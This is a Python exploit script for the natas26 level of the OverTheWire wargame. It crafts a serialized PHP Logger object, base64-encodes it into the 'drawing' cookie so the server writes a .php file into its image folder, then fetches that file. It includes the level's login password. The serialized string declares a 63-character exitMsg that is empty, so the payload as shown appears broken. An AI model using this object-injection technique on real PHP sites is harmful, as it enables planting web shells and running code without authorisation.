import base64
import urllib
import requests

URL = "http://natas26.natas.labs.overthewire.org/?x1=1&y1=1&x2=1&y2=1"
CREDS = ("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T")

s = requests.Session()
s.auth = CREDS

payload_object = 'O:6:"Logger":3:{s:15:"\x00Logger\x00logFile";s:12:"img/poc4.php";s:15:"\x00Logger\x00initMsg";N;s:15:"\x00Logger\x00exitMsg";s:63:"";}'
payload = bytes(payload_object)
payload = base64.b64encode(payload)
#payload = base64.b64encode(bytes(payload_object, encoding="utf8"))
#paylaoad = urllib.parse.quote_plus(payload)

cookie = {"drawing": payload}

x = s.get(URL, cookies=cookie)
print(s.get("http://natas26.natas.labs.overthewire.org/img/poc4.php").text)
